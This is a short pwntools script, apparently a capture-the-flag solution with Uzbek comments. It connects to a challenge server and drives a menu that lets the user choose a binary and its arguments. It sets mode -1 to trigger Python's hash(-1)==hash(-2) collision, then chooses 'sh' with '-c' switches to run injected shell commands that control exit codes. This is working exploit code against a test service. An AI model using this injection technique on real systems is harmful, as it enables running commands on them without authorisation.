from pwn import *

# Server ma'lumotlari
host = '154.57.164.68'
port = 31363

def solve():
    try:
        r = remote(host, port)
        
        # 1. Mode: -1 (hash(-1) == hash(-2) bo'lishi uchun)
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'(mode)> ', b'-1')
        
        # 2. Bin: sh (isalpha() shartiga mos keladi)
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'(bin)> ', b'sh')
        
        # 3. Arguments: Bu yerda biz exit kodlarni boshqaramiz
        # subprocess.run(['sh', switch, arg])
        # arg1: "exit 1", arg2: "exit 2"
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'(arg1,arg2)> ', b'exit 1,exit 2')
        
        # 4. Switches: sh uchun -c argumenti kerak (command bajarish uchun)
        r.sendlineafter(b'> ', b'4')
        r.sendlineafter(b'(switch1,switch2)> ', b'-c,-c')
        
        # 5. Beat the competitor!
        r.sendlineafter(b'> ', b'5')
        
        # Server javobini o'qiymiz
        response = r.recvall(timeout=3).decode()
        print(response)
        
    except Exception as e:
        print(f"Xatolik: {e}")

if __name__ == "__main__":
    solve()
